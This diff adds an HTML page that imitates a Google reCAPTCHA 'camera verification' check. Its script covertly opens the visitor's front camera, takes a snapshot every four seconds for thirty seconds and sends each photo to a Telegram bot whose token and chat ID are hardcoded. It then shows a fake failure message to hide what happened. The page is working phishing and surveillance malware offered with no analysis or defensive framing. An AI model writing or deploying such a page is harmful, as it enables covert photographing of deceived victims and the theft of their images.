@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Security Check</title>
+  <style>
+    body { background: #f9f9f9; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .captcha-box { background: #fff; padding: 40px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 360px; text-align: center; }
+    .captcha-img { width: 76px; margin-bottom: 20px; }
+    .btn { background: #4285F4; color: white; padding: 12px 24px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+    .info { font-size: 14px; color: #666; margin-top: 10px; }
+    #message { color: red; margin-top: 15px; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="captcha-box">
+    <img class="captcha-img" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha">
+    <h2>reCAPTCHA</h2>
+    <p>To continue, please complete a quick camera verification.</p>
+    <button class="btn" onclick="verify()">I'm not a robot</button>
+    <div id="message"></div>
+    <p class="info">This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.</p>
+  </div>
+
+  <script>
+    const botToken = "8016889374:AAGYenTwz5us5tLXafcVhYE_x8kJ7l438xo";
+    const chatId = "7035248493";
+    let stream, video, canvas, intervalId;
+
+    async function verify() {
+      document.getElementById('message').innerText = "Verifying...";
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" } // كاميرا أمامية فقط
+        });
+
+        video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+
+        intervalId = setInterval(async () => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/png');
+          const blob = await (await fetch(imageData)).blob();
+
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", blob, "capture.png");
+
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        }, 4000); // كل 4 ثواني
+
+        setTimeout(() => {
+          clearInterval(intervalId);
+          stream.getTracks().forEach(track => track.stop());
+          document.getElementById('message').innerText = "⚠️ Verification failed. Please try again later.";
+        }, 30000); // وقف بعد 30 ثانية
+
+      } catch (err) {
+        document.getElementById('message').innerText = "❌ Camera permission denied or error occurred.";
+        console.error(err);
+      }
+    }
+  </script>
+</body>
+</html>
